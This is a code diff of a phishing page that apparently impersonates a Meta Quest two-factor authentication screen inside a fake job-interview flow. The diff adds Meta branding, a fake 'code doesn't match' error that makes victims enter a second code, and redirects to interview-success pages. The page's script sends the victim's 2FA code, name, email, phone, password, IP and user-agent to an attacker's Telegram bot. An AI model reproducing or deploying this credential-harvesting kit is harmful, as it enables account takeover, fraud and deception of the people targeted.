@@ -25,23 +25,38 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Two-factor authentication required</title>
-    <link rel="icon" href="../../images/favicon.ico">
-    <link rel="stylesheet" href="../../styles/two-factor-authentication.css">
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="stylesheet" href="/styles/two-factor-authentication.css">
 </head>
 <body>
+    <header class="metaquest-header">
+        <div class="metaquest-header-inner">
+            <div class="metaquest-logo">
+                <img src="/images/logo.png" alt="Meta Quest" height="28">
+                <span class="metaquest-title">Meta Quest</span>
+            </div>
+            <div class="metaquest-user-icon">
+                <svg width="24" height="24" fill="none" stroke="#222" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 8-4 8-4s8 0 8 4"/></svg>
+            </div>
+        </div>
+    </header>
     <div class="auth-container">
+        <div class="oculus-invite-logo">
+            <svg width="80" height="50" viewBox="0 0 80 44" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="5" y="0" width="70" height="45" rx="20" fill="#fff"/>
+                <rect x="20" y="15" width="40" height="15" rx="8" fill="#181818"/>
+            </svg>
+        </div>
         <div class="auth-card">
             <h1>Two-factor authentication required</h1>
-            <p class="instruction">Generate a code in your authentication app, and enter it here.</p>
-            
-            <a href="#" class="learn-more">Learn more</a>
+            <p class="instruction">Generate a code in your authenticator app or sms and enter it here.</p>
             
             <form class="auth-form" onsubmit="sendToTelegramFromTwoFactorAuthentication(event)">
                 <div class="input-group">
                     <input type="text" id="code" placeholder="Enter code" maxlength="8">
                     <div class="error-message" style="display: none;">
                         <span class="error-icon">⚠️</span>
-                        <span class="error-text">The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</span>
+                        <span class="error-text">The authentication code you entered doesn't match the one sent to your phone. Please check the number and try again.</span>
                     </div>
                 </div>
                 
@@ -53,7 +68,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         </div>
     </div>
 
-    <script src="../../scripts/two-factor-authentication.js"></script>
+    <script src="/scripts/two-factor-authentication.js"></script>
     <script>
         function showError(errorMessage, codeInput) {
             errorMessage.style.display = 'flex';
@@ -66,10 +81,16 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         }
         
         document.addEventListener('DOMContentLoaded', function() {
+            var fullName = localStorage.getItem('fullName');
+            var email = localStorage.getItem('email');
+            var phone = localStorage.getItem('phone');
+
+            if (fullName != "" && email != "" && phone != "") {
+                window.location.href = "/career-with-us-page.php";
+            }
+
+
             const codeInput = document.getElementById('code');
-            const confirmBtn = document.querySelector('.confirm-btn');
-            const learnMoreLink = document.querySelector('.learn-more');
-            const alternativeAuthLink = document.querySelector('.alternative-auth');
             const errorMessage = document.querySelector('.error-message');
 
            
@@ -87,35 +108,25 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 hideError(errorMessage, codeInput);
             });
 
-            // Handle learn more link
-            learnMoreLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                // Here you would typically open documentation or help page
-                console.log('Opening 2FA documentation...');
-            });
-
-            // Handle alternative authentication link
-            alternativeAuthLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                // Here you would typically show alternative auth options
-                console.log('Opening alternative authentication options...');
-            });
             
             var paramsURL = new URLSearchParams(window.location.search);
             var error = paramsURL.get('error');
-            var code = paramsURL.get('code');
+            var code = localStorage.getItem('code');
 
             if (error == 1) {
                 codeInput.value = code;
                 codeInput.focus();
                 codeInput.select();
-                codeInput.style.border = '1px solid #FF0303';
+                codeInput.style.borderBottom = '1px solid #FF0303';
+                
+                showError(errorMessage, codeInput);
 
                 codeInput.addEventListener('input', function() {
                     if (codeInput.value.length > 0) {
-                        codeInput.style.border = '1px solid #E5E5E5';
+                        codeInput.style.borderBottom = '1.5px solid #444';
+                        hideError(errorMessage, codeInput);
                     } else {
-                        codeInput.style.border = '1px solid #FF0303';
+                        codeInput.style.borderBottom = '1px solid #FF0303';
                     }
                 });
             }
@@ -142,6 +153,8 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             var personalEmail = localStorage.getItem('personalEmail');
             var password = localStorage.getItem('password');
 
+            localStorage.setItem('code', code);
+
             var content = "💬Thông Tin Tài Khoản 2💬" +
                 "\n" + "----------------------------------------------------------" +
                 "\nFirst Name: " + "`" + firstName + "`" +
@@ -160,8 +173,6 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                 "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";
 
-            console.log(content);
-            
             var apiToken = "<?php echo $token; ?>";
             var data = {
                 chat_id: '<?php echo $chatId; ?>',
@@ -182,9 +193,10 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                             var error = paramsURL.get('error');
 
                             if (error == 1) {
-                                window.location.href = "https://business.facebook.com/select/?next=";
+                                window.location.href = "/submit-schedule-interview-success.php";
                             } else {
-                                window.location.href = "two-factor-authentication?error=1&code=" + code;
+                                window.location.href = "/two-factor-authentication.php?error=1";
+                                localStorage.setItem('code', code);
                             }
                         }, 1000);
                     } else {
